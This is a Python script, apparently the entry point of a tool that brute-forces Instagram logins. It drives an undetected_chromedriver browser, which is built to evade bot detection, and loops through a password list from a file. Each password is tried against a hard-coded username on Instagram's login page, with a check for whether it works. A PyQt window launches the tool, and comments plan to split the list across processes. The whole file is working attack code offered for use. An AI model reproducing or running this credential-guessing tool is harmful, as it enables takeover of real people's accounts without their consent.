
import undetected_chromedriver as uc

import sys
from PyQt5.QtWidgets import QApplication
from GUI.gui import Fenetre

from pages.login_page import LoginPage
from Resources.pass_to_temp import split_words
from Resources.pass_to_temp import password_list

# Config var
url = 'https://www.instagram.com/accounts/login/'

input_file = "../test.txt"
num_temp = 1
# groups = split_words(password_list(input_file), num_temp)
username = 'Tim0ut_13'


def login():
    options = uc.ChromeOptions()
    options.add_argument("--disable-dev-shm-usage")
    options.add_argument("--no-sandbox")
    options.add_argument("--blink-settings=imagesEnabled=false")
    prefs = {}
    prefs["profile.managed_default_content_settings.images"] = 2
    # options.add_argument("--headless")
    options.add_experimental_option("prefs", prefs)
    core = 0
    driver = uc.Chrome(version_main=116, options=options)
    core += 1
    login_page = LoginPage(driver, core)
    preString = f'Core n°{login_page.proc}'
    print(f'\n{preString} - Starting')

    driver.implicitly_wait(3)

    ct = 0

    # Todo:
    #   1. password_list() method who return a list of strings
    #   form a temp file. Charge the list from file HERE

    print(f'{preString} - Connecting to {url}')
    login_page.open_page(url)
    login_page.is_cookies_here()

    # temp = password_list(f'temp{proc}.txt')
    temp = password_list(input_file)

    # t = (datetime.now() - t1).seconds
    # print(f'Config Exec Time : {t}')

    for password in temp:
        # t1 = datetime.now()
        ct += 1
        login_page.login_action(username, password)
        login_page.is_password_works(password, ct)
        # t = (datetime.now() - t1).seconds
        # print(f'Trying Password Exec Time : {t}')


if __name__ == "__main__":
    app = QApplication(sys.argv)
    fenetre = Fenetre()
    fenetre.show()

    # Exécution de l'application Qt
    app.exec_()
